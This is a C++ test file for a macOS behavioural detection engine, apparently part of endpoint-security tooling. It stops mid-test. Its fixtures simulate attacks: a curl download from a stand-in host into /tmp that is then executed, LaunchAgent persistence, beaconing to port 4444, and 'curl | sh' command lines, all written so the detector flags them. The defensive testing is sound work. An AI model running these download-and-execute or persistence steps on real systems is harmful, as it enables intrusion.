#include "test_framework.h"

#include "behavior/alert_store.h"
#include "behavior/engine.h"
#include "behavior/es_parser.h"
#include "behavior/net_util.h"
#include "behavior/process_tree.h"
#include "behavior/rules.h"

#include <algorithm>
#include <sstream>

using namespace sec;
using namespace sec::behavior;

namespace {

std::vector<Alert> feed(Engine& e, const std::string& line) {
    const ParseResult r = parse_event_line(line);
    CHECK(r.ok());
    if (!r.ok()) return {};
    return e.process(r.event);
}

std::vector<Alert> feed_all(Engine& e, const std::string& text) {
    std::vector<Alert> all;
    std::istringstream in(text);
    std::string line;
    while (std::getline(in, line)) {
        const ParseResult r = parse_event_line(line);
        if (r.status == ParseResult::Status::Skipped) continue;
        CHECK(r.ok());
        if (!r.ok()) continue;
        for (Alert& a : e.process(r.event)) all.push_back(std::move(a));
    }
    return all;
}

bool has_rule(const Alert& a, const std::string& id) {
    return std::find(a.rule_ids.begin(), a.rule_ids.end(), id) != a.rule_ids.end();
}

bool any_alert_has(const std::vector<Alert>& alerts, const std::string& id) {
    for (const Alert& a : alerts) {
        if (has_rule(a, id)) return true;
    }
    return false;
}

const char* kChain = R"(
{"type":"exec","time_ms":1000000,"pid":500,"ppid":1,"path":"/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word","args":["Microsoft Word"],"signing":"team:UBF8T346G9"}
{"type":"exec","time_ms":1002000,"pid":510,"ppid":500,"path":"/bin/bash","args":["bash","-c","id"],"signing":"platform"}
{"type":"exec","time_ms":1003000,"pid":511,"ppid":510,"path":"/usr/bin/curl","args":["curl","-s","-o","/tmp/.x","http://203.0.113.9/x"],"signing":"platform"}
{"type":"file_create","time_ms":1003500,"pid":511,"path":"/usr/bin/curl","file":"/tmp/.x","signing":"platform"}
{"type":"exit","time_ms":1004000,"pid":511}
{"type":"exec","time_ms":1005000,"pid":512,"ppid":510,"path":"/bin/chmod","args":["chmod","+x","/tmp/.x"],"signing":"platform"}
{"type":"exec","time_ms":1006000,"pid":513,"ppid":510,"path":"/tmp/.x","args":["/tmp/.x"],"signing":"unsigned"}
{"type":"file_create","time_ms":1007000,"pid":513,"path":"/tmp/.x","file":"/Users/victim/Library/LaunchAgents/com.update.helper.plist","signing":"unsigned"}
{"type":"exec","time_ms":1008000,"pid":514,"ppid":513,"path":"/bin/launchctl","args":["launchctl","load","/Users/victim/Library/LaunchAgents/com.update.helper.plist"],"signing":"platform"}
{"type":"net","time_ms":1010000,"pid":513,"path":"/tmp/.x","remote_ip":"203.0.113.9","remote_port":4444,"signing":"unsigned"}
{"type":"net","time_ms":1070000,"pid":513,"path":"/tmp/.x","remote_ip":"203.0.113.9","remote_port":4444,"signing":"unsigned"}
{"type":"net","time_ms":1130000,"pid":513,"path":"/tmp/.x","remote_ip":"203.0.113.9","remote_port":4444,"signing":"unsigned"}
{"type":"net","time_ms":1190000,"pid":513,"path":"/tmp/.x","remote_ip":"203.0.113.9","remote_port":4444,"signing":"unsigned"}
{"type":"net","time_ms":1250000,"pid":513,"path":"/tmp/.x","remote_ip":"203.0.113.9","remote_port":4444,"signing":"unsigned"}
{"type":"net","time_ms":1310000,"pid":513,"path":"/tmp/.x","remote_ip":"203.0.113.9","remote_port":4444,"signing":"unsigned"}
)";

const char* kBenign = R"(
{"type":"exec","time_ms":2000000,"pid":600,"ppid":1,"path":"/Applications/Terminal.app/Contents/MacOS/Terminal","args":["Terminal"],"signing":"platform"}
{"type":"exec","time_ms":2001000,"pid":601,"ppid":600,"path":"/bin/zsh","args":["zsh"],"signing":"platform"}
{"type":"exec","time_ms":2002000,"pid":602,"ppid":601,"path":"/usr/bin/clang","args":["clang","-o","/tmp/hello","hello.c"],"signing":"platform"}
{"type":"file_create","time_ms":2003000,"pid":602,"path":"/usr/bin/clang","file":"/tmp/hello","signing":"platform"}
{"type":"exec","time_ms":2004000,"pid":603,"ppid":601,"path":"/tmp/hello","args":["/tmp/hello"],"signing":"adhoc"}
{"type":"net","time_ms":2005000,"pid":603,"path":"/tmp/hello","remote_ip":"192.168.1.10","remote_port":8080,"signing":"adhoc"}
{"type":"exec","time_ms":2006000,"pid":604,"ppid":601,"path":"/usr/bin/curl","args":["curl","-s","https://api.github.com"],"signing":"platform"}
{"type":"net","time_ms":2007000,"pid":604,"path":"/usr/bin/curl","remote_ip":"140.82.112.5","remote_port":443,"remote_host":"api.github.com","signing":"platform"}
)";

}

// ---- net_util ------------------------------------------------------------------------------

TEST(net_ip_classification) {
    CHECK(net::is_private_or_local("10.1.2.3"));
    CHECK(net::is_private_or_local("127.0.0.1"));
    CHECK(net::is_private_or_local("192.168.0.5"));
    CHECK(net::is_private_or_local("172.16.0.1"));
    CHECK(net::is_private_or_local("172.31.255.255"));
    CHECK(!net::is_private_or_local("172.32.0.1"));
    CHECK(net::is_private_or_local("169.254.1.1"));
    CHECK(net::is_private_or_local("100.64.0.1"));
    CHECK(net::is_private_or_local("224.0.0.251"));
    CHECK(!net::is_private_or_local("8.8.8.8"));
    CHECK(!net::is_private_or_local("203.0.113.9"));
    CHECK(net::is_private_or_local("::1"));
    CHECK(net::is_private_or_local("fe80::1"));
    CHECK(net::is_private_or_local("fd00::1"));
    CHECK(net::is_private_or_local("::ffff:10.0.0.1"));
    CHECK(!net::is_private_or_local("2606:4700:4700::1111"));
    CHECK(net::is_private_or_local("not an ip"));
    CHECK(net::is_private_or_local(""));
}

TEST(net_parse_ipv4_rejects_garbage) {
    std::uint32_t v = 0;
    CHECK(net::parse_ipv4("1.2.3.4", v));
    CHECK(v == 0x01020304u);
    CHECK(!net::parse_ipv4("1.2.3", v));
    CHECK(!net::parse_ipv4("1.2.3.4.5", v));
    CHECK(!net::parse_ipv4("256.1.1.1", v));
    CHECK(!net::parse_ipv4("1..2.3", v));
    CHECK(!net::parse_ipv4("a.b.c.d", v));
    CHECK(!net::parse_ipv4("1.2.3.4 ", v));
    CHECK(!net::parse_ipv4("", v));
}

TEST(net_cidr_and_host_matching) {
    CHECK(net::ip_matches("203.0.113.9", "203.0.113.0/24"));
    CHECK(!net::ip_matches("203.0.114.9", "203.0.113.0/24"));
    CHECK(net::ip_matches("1.2.3.4", "1.2.3.4"));
    CHECK(net::ip_matches("1.2.3.4", "0.0.0.0/0"));
    CHECK(net::ip_matches("1.2.3.4", "1.2.3.4/32"));
    CHECK(!net::ip_matches("1.2.3.5", "1.2.3.4/32"));
    CHECK(!net::ip_matches("1.2.3.4", "1.2.3.0/33"));
    CHECK(net::host_matches("Example.COM", "example.com"));
    CHECK(net::host_matches("a.b.example.com", "*.example.com"));
    CHECK(net::host_matches("example.com", "*.example.com"));
    CHECK(!net::host_matches("badexample.com", "*.example.com"));
    CHECK(!net::host_matches("example.com.evil.net", "*.example.com"));
}

TEST(net_domain_heuristics) {
    CHECK(net::registrable_domain("a.b.example.com") == "example.com");
    CHECK(net::registrable_domain("www.naver.co.kr") == "naver.co.kr");
    CHECK(net::registrable_domain("example.com.") == "example.com");
    CHECK(net::registrable_domain("localhost") == "localhost");

    CHECK(!net::looks_like_dga("www.google.com"));
    CHECK(!net::looks_like_dga("api.github.com"));
    CHECK(!net::looks_like_dga("accounts.googleusercontent.com"));
    CHECK(net::looks_like_dga("xkqzjvbnwpltrmqe.com"));
    CHECK(net::looks_like_dga("a8f3k2m9x7q1z5v4b6n0.net"));
    CHECK(!net::looks_like_dga("short.com"));

    CHECK(!net::looks_like_tunnel("www.example.com"));
    CHECK(net::looks_like_tunnel("aGVsbG8gd29ybGQgdGhpcyBpcyBhIHZlcnkgbG9uZyBsYWJlbCB0aGF0IGlzIGVuY29kZWQ.evil.com"));
    CHECK(net::looks_like_tunnel(std::string(120, 'a') + ".com"));
    CHECK(net::shannon_entropy("aaaa") == 0.0);
    CHECK(net::shannon_entropy("abcd") > 1.99);
}

// ---- process tree --------------------------------------------------------------------------

TEST(process_tree_inheritance_and_chain) {
    ProcessTree t;
    ProcessRef sh;
    sh.pid = 10;
    sh.ppid = 1;
    sh.path = "/bin/SH";
    ProcNode& a = t.on_exec(sh, 1000);
    CHECK(a.name == "sh");
    a.score = 55;
    a.alert_level = 1;
    a.tags["staged"] = 1000;

    ProcessRef child;
    child.pid = 11;
    child.ppid = 10;
    child.path = "/usr/bin/curl";
    ProcNode& b = t.on_exec(child, 2000);
    CHECK(b.score == 55);
    CHECK(b.alert_level == 1);
    CHECK(b.tags.count("staged") == 1);
    CHECK(b.hit_ids.empty());

    // changing the child must not affect the parent
    b.score += 10;
    CHECK(t.find(10)->score == 55);

    const auto chain = t.chain(11);
    CHECK(chain.size() == 2);
    CHECK(chain[0]->pid == 11);
    CHECK(chain[1]->pid == 10);
}

TEST(process_tree_reexec_keeps_state_and_pid_reuse_resets) {
    ProcessTree t;
    ProcessRef r;
    r.pid = 20;
    r.ppid = 1;
    r.path = "/bin/sh";
    ProcNode& n = t.on_exec(r, 100);
    n.score = 30;
    n.hit_ids.insert("x");
    r.path = "/tmp/payload";
    ProcNode& n2 = t.on_exec(r, 200);
    CHECK(&n == &n2);
    CHECK(n2.score == 30);
    CHECK(n2.path == "/tmp/payload");
    CHECK(n2.hit_ids.empty());

    t.on_exit(20, 300);
    ProcessRef reuse;
    reuse.pid = 20;
    reuse.ppid = 1;
    reuse.path = "/bin/ls";
    ProcNode& n3 = t.on_exec(reuse, 400);
    CHECK(n3.score == 0);
    CHECK(!n3.exited);
}

TEST(process_tree_cycle_safe_and_gc) {
    ProcessTree t(10);
    ProcessRef a;
    a.pid = 1;
    a.ppid = 2;
    a.path = "/a";
    ProcessRef b;
    b.pid = 2;
    b.ppid = 1;
    b.path = "/b";
    t.on_exec(a, 0);
    t.on_exec(b, 0);
    CHECK(t.chain(1, 50).size() == 2);

    for (int i = 100; i < 140; ++i) {
        ProcessRef r;
        r.pid = i;
        r.ppid = 0;
        r.path = "/x";
        t.on_exec(r, i);
        t.on_exit(i, i);
    }
    t.gc(10'000'000);
    CHECK(t.size() <= 2 + 0);
    CHECK(t.find(1) != nullptr);
}

// ---- time + parsers ------------------------------------------------------------------------

TEST(iso8601_parsing) {
    CHECK(parse_iso8601_ms("1970-01-01T00:00:00Z") == 0);
    CHECK(parse_iso8601_ms("2000-01-01T00:00:00Z") == 946684800000LL);
    CHECK(parse_iso8601_ms("2026-11-05T12:34:56.789Z") == 1793882096789LL);
    CHECK(parse_iso8601_ms("2026-11-05T12:34:56.789123456Z") == 1793882096789LL);
    CHECK(parse_iso8601_ms("2026-11-05T21:34:56+09:00") == 1793882096000LL);
    CHECK(!parse_iso8601_ms("garbage").has_value());
    CHECK(!parse_iso8601_ms("2026-13-05T12:34:56Z").has_value());
    CHECK(!parse_iso8601_ms("2026-11-05T12:34:56Zjunk").has_value());
}

TEST(eslogger_exec_and_file_events) {
    const std::string exec = R"({"event_type":9,"time":"2026-11-05T12:34:56.789Z","process":{"audit_token":{"pid":100},"ppid":1,"executable":{"path":"/bin/zsh"},"signing_id":"com.apple.zsh","team_id":"","is_platform_binary":true},"event":{"exec":{"target":{"audit_token":{"pid":101},"ppid":100,"executable":{"path":"/tmp/payload"},"signing_id":"payload","team_id":"","is_platform_binary":false},"args":["/tmp/payload","--x"]}}})";
    ParseResult r = parse_eslogger_line(exec);
    CHECK(r.ok());
    CHECK(r.event.type == EventType::Exec);
    CHECK(r.event.proc.pid == 101);
    CHECK(r.event.proc.ppid == 100);
    CHECK(r.event.proc.path == "/tmp/payload");
    CHECK(r.event.proc.args.size() == 2);
    CHECK(r.event.proc.sig_known);
    CHECK(!r.event.proc.platform_binary);
    CHECK(r.event.time_ms == 1793882096789LL);

    const std::string create = R"({"time":"2026-11-05T12:34:57Z","process":{"audit_token":{"pid":101},"ppid":100,"executable":{"path":"/tmp/payload"},"signing_id":"","team_id":"","is_platform_binary":false},"event":{"create":{"destination_type":1,"destination":{"new_path":{"dir":{"path":"/Users/u/Library/LaunchAgents"},"filename":"a.plist"}}}}})";
    r = parse_eslogger_line(create);
    CHECK(r.ok());
    CHECK(r.event.type == EventType::FileCreate);
    CHECK(r.event.file_path == "/Users/u/Library/LaunchAgents/a.plist");
    CHECK(r.event.proc.sig_known);

    const std::string close_mod = R"({"time":"2026-11-05T12:34:58Z","process":{"audit_token":{"pid":101},"ppid":100,"executable":{"path":"/tmp/payload"}},"event":{"close":{"modified":true,"target":{"path":"/tmp/out"}}}})";
    r = parse_eslogger_line(close_mod);
    CHECK(r.ok());
    CHECK(r.event.type == EventType::FileModify);
    CHECK(!r.event.proc.sig_known);

    const std::string close_clean = R"({"process":{"audit_token":{"pid":101}},"event":{"close":{"modified":false,"target":{"path":"/tmp/out"}}}})";
    CHECK(parse_eslogger_line(close_clean).status == ParseResult::Status::Skipped);

    const std::string rename = R"({"process":{"audit_token":{"pid":5},"ppid":1,"executable":{"path":"/Applications/Safari.app/Contents/MacOS/Safari"}},"event":{"rename":{"source":{"path":"/Users/u/Downloads/a.crdownload"},"destination_type":0,"destination":{"existing_file":{"path":"/Users/u/Downloads/a.dmg"}}}}})";
    r = parse_eslogger_line(rename);
    CHECK(r.ok());
    CHECK(r.event.type == EventType::FileRename);
    CHECK(r.event.file_from == "/Users/u/Downloads/a.crdownload");
    CHECK(r.event.file_path == "/Users/u/Downloads/a.dmg");
}

TEST(eslogger_fork_exit_skip_and_errors) {
    const std::string fork = R"({"process":{"audit_token":{"pid":10},"ppid":1,"executable":{"path":"/bin/sh"}},"event":{"fork":{"child":{"audit_token":{"pid":11},"ppid":10,"executable":{"path":"/bin/sh"}}}}})";
    ParseResult r = parse_eslogger_line(fork);
    CHECK(r.ok());
    CHECK(r.event.type == EventType::Fork);
    CHECK(r.event.proc.pid == 11);
    CHECK(r.event.proc.ppid == 10);

    const std::string exit = R"({"process":{"audit_token":{"pid":11},"ppid":10},"event":{"exit":{"stat":0}}})";
    r = parse_eslogger_line(exit);
    CHECK(r.ok());
    CHECK(r.event.type == EventType::Exit);

    CHECK(parse_eslogger_line(R"({"process":{"audit_token":{"pid":1}},"event":{"mmap":{}}})").status ==
          ParseResult::Status::Skipped);
    CHECK(parse_eslogger_line("not json").status == ParseResult::Status::Error);
    CHECK(parse_eslogger_line(R"({"event":{}})").status == ParseResult::Status::Error);
    CHECK(parse_eslogger_line(R"({"event":{"exec":{"target":{}}}})").status == ParseResult::Status::Error);
}

TEST(normalized_parser_validation) {
    CHECK(parse_event_line("").status == ParseResult::Status::Skipped);
    CHECK(parse_event_line("# comment").status == ParseResult::Status::Skipped);
    CHECK(parse_event_line(R"({"type":"net","pid":1,"remote_ip":"1.2.3.4","remote_port":80})").ok());
    CHECK(parse_event_line(R"({"type":"net","pid":1})").status == ParseResult::Status::Error);
    CHECK(parse_event_line(R"({"type":"dns","pid":1})").status == ParseResult::Status::Error);
    CHECK(parse_event_line(R"({"type":"bogus","pid":1})").status == ParseResult::Status::Error);
    CHECK(parse_event_line(R"({"type":"exit"})").status == ParseResult::Status::Error);
    const ParseResult r = parse_event_line(R"({"type":"exec","pid":3,"path":"/x","signing":"team:ABC"})");
    CHECK(r.ok());
    CHECK(r.event.proc.team_id == "ABC");
    CHECK(r.event.proc.sig_known);
}

// ---- rules ---------------------------------------------------------------------------------

TEST(default_rules_load_and_are_consistent) {
    std::string err;
    RuleSet rs;
    CHECK(load_ruleset_text(default_rules_json(), rs, &err));
    CHECK(err.empty());
    CHECK(rs.rules.size() >= 30);
    CHECK(rs.warn_threshold == 60);
    CHECK(rs.critical_threshold == 100);
    for (const Rule& r : rs.rules) {
        CHECK(!r.id.empty());
        CHECK(!r.title.empty());
        CHECK(r.score > 0);
    }
    CHECK(default_ruleset().rules.size() == rs.rules.size());
}

TEST(rules_loader_is_strict) {
    RuleSet rs;
    std::string err;
    CHECK(!load_ruleset_text(R"({"rules":[{"id":"a","title":"t","event":"exec","score":1,"when":{"bogus":[]}}]})", rs, &err));
    CHECK(err.find("bogus") != std::string::npos);
    CHECK(!load_ruleset_text(R"({"rules":[{"id":"a","title":"t","event":"exec","score":1,"nope":1}]})", rs, &err));
    CHECK(!load_ruleset_text(R"({"rules":[{"id":"a","title":"t","event":"disk","score":1}]})", rs, &err));
    CHECK(!load_ruleset_text(R"({"rules":[{"title":"t","event":"exec","score":1}]})", rs, &err));
    CHECK(!load_ruleset_text(R"({"rules":[{"id":"a","event":"exec","score":1}]})", rs, &err));
    CHECK(!load_ruleset_text(R"({"rules":[{"id":"a","title":"t","event":"exec"}]})", rs, &err));
    CHECK(!load_ruleset_text(R"({"rules":[{"id":"a","title":"t","event":"exec","score":1,"when":{"name_any":"sh"}}]})", rs, &err));
    CHECK(!load_ruleset_text(R"({"rules":[{"id":"a","title":"t","event":"net","score":1,"when":{"port_any":[70000]}}]})", rs, &err));
    CHECK(!load_ruleset_text(R"({"rules":[{"id":"a","title":"t","event":"exec","score":1},{"id":"a","title":"u","event":"exec","score":1}]})", rs, &err));
    CHECK(err.find("duplicate") != std::string::npos);
    CHECK(!load_ruleset_text(R"({"thresholds":{"warn":50,"critical":10}})", rs, &err));
    CHECK(!load_ruleset_text(R"({"egress":{"enabled":"yes"}})", rs, &err));
    CHECK(!load_ruleset_text(R"({"unknown":1})", rs, &err));
    CHECK(!load_ruleset_text("[]", rs, &err));
    CHECK(!load_ruleset_text("{", rs, &err));
    CHECK(load_ruleset_text(R"({"rules":[]})", rs, &err));
}

TEST(ruleset_merge_replaces_by_id) {
    RuleSet base = default_ruleset();
    const std::size_t n = base.rules.size();
    RuleSet over;
    CHECK(load_ruleset_text(
        R"({"thresholds":{"warn":30,"critical":80},"rules":[
            {"id":"mac.exec.log_erase","title":"교체됨","event":"exec","score":5},
            {"id":"custom.one","title":"새 규칙","event":"exec","score":10}]})",
        over, nullptr));
    merge_ruleset(base, over);
    CHECK(base.rules.size() == n + 1);
    CHECK(base.warn_threshold == 30);
    bool replaced = false;
    for (const Rule& r : base.rules) {
        if (r.id == "mac.exec.log_erase") replaced = r.title == "교체됨" && r.score == 5;
    }
    CHECK(replaced);
}

TEST(ioc_loader) {
    IocSet ioc;
    std::string err;
    CHECK(load_ioc_text(R"({"ips":["203.0.113.0/24"],"hosts":["*.evil.test"]})", ioc, &err));
    CHECK(ioc.ips.size() == 1 && ioc.hosts.size() == 1);
    CHECK(!load_ioc_text(R"({"urls":[]})", ioc, &err));
    CHECK(!load_ioc_text(R"({"ips":"x"})", ioc, &err));
}

// ---- engine --------------------------------------------------------------------------------

TEST(engine_full_attack_chain_raises_staged_alerts) {
    Engine e(default_ruleset());
    const std::vector<Alert> alerts = feed_all(e, kChain);
    CHECK(alerts.size() >= 4);

    int criticals = 0;
    for (const Alert& a : alerts) {
        CHECK(a.level == 1 || a.level == 2);
        CHECK(a.score >= 60);
        CHECK(!a.title.empty());
        CHECK(!a.chain.empty());
        CHECK(!a.detail.empty());
        if (a.level == 2) ++criticals;
    }
    CHECK(criticals >= 1);

    CHECK(any_alert_has(alerts, "mac.exec.shell_from_app"));
    CHECK(any_alert_has(alerts, "mac.exec.downloader_to_tmp"));
    CHECK(any_alert_has(alerts, "mac.exec.unsigned_from_tmp"));
    CHECK(any_alert_has(alerts, "mac.exec.recent_download"));
    CHECK(any_alert_has(alerts, "mac.persist.launchd_plist_unsigned"));
    CHECK(any_alert_has(alerts, "mac.net.after_staging"));
    CHECK(any_alert_has(alerts, "mac.net.beaconing"));

    // the persistence alert is raised by the dropper itself and mentions the whole chain
    bool persistence_alert = false;
    for (const Alert& a : alerts) {
        if (a.detail.find("LaunchAgents") != std::string::npos) {
            persistence_alert = true;
            CHECK(a.pid == 513);
            CHECK(a.chain.size() >= 3);
            CHECK(std::find(a.techniques.begin(), a.techniques.end(), "T1543.001") != a.techniques.end());
        }
    }
    CHECK(persistence_alert);

    // the C2 alert comes last and carries the earlier stages in its rule list
    const Alert& last = alerts.back();
    CHECK(last.detail.find("203.0.113.9:4444") != std::string::npos);
    CHECK(has_rule(last, "mac.net.after_staging"));
    CHECK(has_rule(last, "mac.persist.launchd_plist_unsigned"));
    CHECK(has_rule(last, "mac.exec.shell_from_app"));
}

TEST(engine_benign_developer_activity_is_quiet) {
    Engine e(default_ruleset());
    CHECK(feed_all(e, kBenign).empty());
}

TEST(engine_beaconing_needs_regular_intervals) {
    Engine e(default_ruleset());
    feed(e, R"({"type":"exec","time_ms":1000,"pid":50,"ppid":1,"path":"/opt/agent","args":["agent"],"signing":"unsigned"})");
    // irregular intervals: no beaconing rule
    const long long times[] = {10000, 12000, 40000, 41000, 100000, 101000, 180000, 181000};
    for (const long long t : times) {
        const auto a = feed(e, std::string(R"({"type":"net","time_ms":)") + std::to_string(t) +
                                   R"(,"pid":50,"path":"/opt/agent","remote_ip":"198.51.100.7","remote_port":443,"signing":"unsigned"})");
        for (const Alert& x : a) CHECK(!has_rule(x, "mac.net.beaconing"));
    }
    const ProcNode* n = e.tree().find(50);
    CHECK(n != nullptr);
    CHECK(n->hit_ids.count("mac.net.beaconing") == 0);
    CHECK(n->hit_ids.count("mac.net.unsigned_public") == 1);

    // fast but regular traffic (<5s mean interval) is not beaconing either (normal chatter)
    feed(e, R"({"type":"exec","time_ms":1000,"pid":51,"ppid":1,"path":"/opt/agent2","args":["agent2"],"signing":"unsigned"})");
    for (int i = 0; i < 10; ++i) {
        feed(e, std::string(R"({"type":"net","time_ms":)") + std::to_string(10000 + i * 1000) +
                    R"(,"pid":51,"path":"/opt/agent2","remote_ip":"198.51.100.8","remote_port":443,"signing":"unsigned"})");
    }
    CHECK(e.tree().find(51)->hit_ids.count("mac.net.beaconing") == 0);

    // slow and regular: beaconing
    feed(e, R"({"type":"exec","time_ms":1000,"pid":52,"ppid":1,"path":"/opt/agent3","args":["agent3"],"signing":"unsigned"})");
    for (int i = 0; i < 8; ++i) {
        feed(e, std::string(R"({"type":"net","time_ms":)") + std::to_string(10000 + i * 30000) +
                    R"(,"pid":52,"path":"/opt/agent3","remote_ip":"198.51.100.9","remote_port":443,"signing":"unsigned"})");
    }
    CHECK(e.tree().find(52)->hit_ids.count("mac.net.beaconing") == 1);
}

TEST(engine_curl_pipe_shell_from_browser_is_critical) {
    Engine e(default_ruleset());
    feed(e, R"({"type":"exec","time_ms":1000,"pid":70,"ppid":1,"path":"/Applications/Safari.app/Contents/MacOS/Safari","args":["Safari"],"signing":"platform"})");
    const auto a = feed(e, R"({"type":"exec","time_ms":2000,"pid":71,"ppid":70,"path":"/bin/bash","args":["bash","-c","curl -s http://203.0.113.9/a.sh | sh"],"signing":"platform"})");
    CHECK(a.size() == 1);
    CHECK(a[0].level == 2);
    CHECK(has_rule(a[0], "mac.exec.curl_pipe_shell"));
    CHECK(has_rule(a[0], "mac.exec.shell_from_app"));
}

TEST(engine_single_weak_signal_does_not_alert) {
    Engine e(default_ruleset());
    const auto a = feed(e, R"({"type":"exec","time_ms":1000,"pid":80,"ppid":1,"path":"/bin/bash","args":["bash","-c","curl -s http://x/a.sh | sh"],"signing":"platform"})");
    CHECK(a.empty());
    CHECK(e.tree().find(80)->score == 50);
}

TEST(engine_rule_fires_once_per_process) {
    Engine e(default_ruleset());
    feed(e, R"({"type":"exec","time_ms":1000,"pid":90,"ppid":1,"path":"/opt/x","args":["x"],"signing":"unsigned"})");
    for (int i = 0; i < 5; ++i) {
        feed(e, std::string(R"({"type":"net","time_ms":)") + std::to_string(2000 + i) +
                    R"(,"pid":90,"path":"/opt/x","remote_ip":"198.51.100.1","remote_port":443,"signing":"unsigned"})");
    }
    CHECK(e.tree().find(90)->score == 15);
}

TEST(engine_ioc_ip_and_host) {
    Engine e(default_ruleset());
    IocSet ioc;
    CHECK(load_ioc_text(R"({"ips":["198.51.100.0/24"],"hosts":["*.bad.test"]})", ioc, nullptr));
    e.set_ioc(ioc);

    feed(e, R"({"type":"exec","time_ms":1000,"pid":100,"ppid":1,"path":"/usr/bin/curl","args":["curl"],"signing":"platform"})");
    auto a = feed(e, R"({"type":"net","time_ms":2000,"pid":100,"path":"/usr/bin/curl","remote_ip":"198.51.100.20","remote_port":80,"signing":"platform"})");
    CHECK(a.size() == 1);
    CHECK(a[0].level == 2);
    CHECK(has_rule(a[0], "mac.net.ioc_match"));

    a = feed(e, R"({"type":"dns","time_ms":3000,"pid":101,"path":"/usr/sbin/mDNSResponder","dns_name":"c2.bad.test","signing":"platform"})");
    CHECK(a.size() == 1);
    CHECK(has_rule(a[0], "mac.dns.ioc_match"));

    a = feed(e, R"({"type":"dns","time_ms":4000,"pid":102,"path":"/usr/sbin/mDNSResponder","dns_name":"www.good.test","signing":"platform"})");
    CHECK(a.empty());
}

TEST(engine_dns_heuristics_score_but_do_not_alert_alone) {
    Engine e(default_ruleset());
    auto a = feed(e, R"({"type":"dns","time_ms":1000,"pid":110,"path":"/opt/x","dns_name":"xkqzjvbnwpltrmqe.com","signing":"unsigned"})");
    CHECK(a.empty());
    CHECK(e.tree().find(110)->hit_ids.count("mac.dns.dga_like") == 1);
    a = feed(e, std::string(R"({"type":"dns","time_ms":2000,"pid":110,"path":"/opt/x","dns_name":")") +
                    std::string(60, 'a') + "." + std::string(60, 'b') + R"(.evil.com","signing":"unsigned"})");
    CHECK(e.tree().find(110)->hit_ids.count("mac.dns.tunnel_like") == 1);
    CHECK(a.size() == 1);  // 30 + 40 = 70 crosses the warning threshold
    CHECK(a[0].level == 1);
}

TEST(engine_egress_policy) {
    RuleSet rs = default_ruleset();
    RuleSet over;
    CHECK(load_ruleset_text(R"({"egress":{"enabled":true,"applies_to":["agentx"],
        "allow":["203.0.113.0/24","*.corp.example"],
        "per_process":{"agentx":["198.51.100.5"]}}})", over, nullptr));
    merge_ruleset(rs, over);
    Engine e(rs);

    feed(e, R"({"type":"exec","time_ms":1000,"pid":120,"ppid":1,"path":"/opt/agentx","args":["agentx"],"signing":"team:ABC"})");
    auto net = [&](int t, const char* ip, const char* host) {
        return feed(e, std::string(R"({"type":"net","time_ms":)") + std::to_string(t) +
                           R"(,"pid":120,"path":"/opt/agentx","remote_ip":")" + ip + R"(","remote_port":443,"remote_host":")" +
                           host + R"(","signing":"team:ABC"})");
    };
    CHECK(net(2000, "203.0.113.50", "").empty());
    CHECK(e.tree().find(120)->hit_ids.count("mac.net.egress_violation") == 0);
    CHECK(net(3000, "192.0.2.200", "api.corp.example").empty());
    CHECK(e.tree().find(120)->hit_ids.count("mac.net.egress_violation") == 0);
    CHECK(net(4000, "198.51.100.5", "").empty());
    CHECK(e.tree().find(120)->hit_ids.count("mac.net.egress_violation") == 0);
    // private destinations are never a violation
    CHECK(net(5000, "10.0.0.5", "").empty());
    CHECK(e.tree().find(120)->hit_ids.count("mac.net.egress_violation") == 0);
    // not allowed -> violation (60 points => warning)
    const auto a = net(6000, "192.0.2.77", "evil.example");
    CHECK(a.size() == 1);
    CHECK(has_rule(a[0], "mac.net.egress_violation"));

    // processes outside applies_to are not checked
    feed(e, R"({"type":"exec","time_ms":7000,"pid":121,"ppid":1,"path":"/opt/other","args":["other"],"signing":"team:ABC"})");
    feed(e, R"({"type":"net","time_ms":8000,"pid":121,"path":"/opt/other","remote_ip":"192.0.2.77","remote_port":443,"signing":"team:ABC"})");
    CHECK(e.tree().find(121)->hit_ids.count("mac.net.egress_violation") == 0);
}

TEST(engine_egress_disabled_by_default) {
    Engine e(default_ruleset());
    feed(e, R"({"type":"exec","time_ms":1000,"pid":130,"ppid":1,"path":"/opt/agentx","args":["agentx"],"signing":"team:ABC"})");
    const auto a = feed(e, R"({"type":"net","time_ms":2000,"pid":130,"path":"/opt/agentx","remote_ip":"192.0.2.77","remote_port":443,"signing":"team:ABC"})");
    CHECK(a.empty());
    CHECK(e.tree().find(130)->score == 0);
}

TEST(engine_tags_expire_after_window) {
    RuleSet rs;
    CHECK(load_ruleset_text(R"({"tag_window_s":60,"rules":[
        {"id":"r.stage","title":"stage","event":"exec","score":10,"tag":"s","when":{"name_any":["dropper"]}},
        {"id":"r.follow","title":"follow","event":"net","score":100,"when":{"requires_tag_any":["s"]}}]})",
                            rs, nullptr));
    Engine e(rs);
    feed(e, R"({"type":"exec","time_ms":0,"pid":140,"ppid":1,"path":"/tmp/dropper","args":["dropper"],"signing":"unsigned"})");
    auto a = feed(e, R"({"type":"net","time_ms":30000,"pid":140,"path":"/tmp/dropper","remote_ip":"8.8.8.8","remote_port":1})");
    CHECK(a.size() == 1);
    CHECK(a[0].level == 2);

    feed(e, R"({"type":"exec","time_ms":0,"pid":141,"ppid":1,"path":"/tmp/dropper","args":["dropper"],"signing":"unsigned"})");
    a = feed(e, R"({"type":"net","time_ms":61000,"pid":141,"path":"/tmp/dropper","remote_ip":"8.8.8.8","remote_port":1})");
    CHECK(a.empty());
}

TEST(engine_children_inherit_tags_and_score) {
    RuleSet rs;
    CHECK(load_ruleset_text(R"({"rules":[
        {"id":"r.stage","title":"stage","event":"exec","score":50,"tag":"s","when":{"name_any":["dropper"]}},
        {"id":"r.follow","title":"follow","event":"exec","score":20,"when":{"name_any":["child"],"requires_tag_any":["s"]}}]})",
                            rs, nullptr));
    Engine e(rs);
    feed(e, R"({"type":"exec","time_ms":0,"pid":150,"ppid":1,"path":"/tmp/dropper","args":["dropper"]})");
    feed(e, R"({"type":"fork","time_ms":10,"pid":151,"ppid":150})");
    CHECK(e.tree().find(151)->score == 50);
    CHECK(e.tree().find(151)->path == "/tmp/dropper");
    const auto a = feed(e, R"({"type":"exec","time_ms":20,"pid":151,"ppid":150,"path":"/usr/bin/child","args":["child"]})");
    CHECK(a.size() == 1);
    CHECK(a[0].score == 70);
    CHECK(a[0].chain.size() == 2);
    CHECK(has_rule(a[0], "r.stage"));
    CHECK(has_rule(a[0], "r.follow"));
}

TEST(engine_disabled_rule_and_unknown_signing) {
    RuleSet rs;
    CHECK(load_ruleset_text(R"({"rules":[
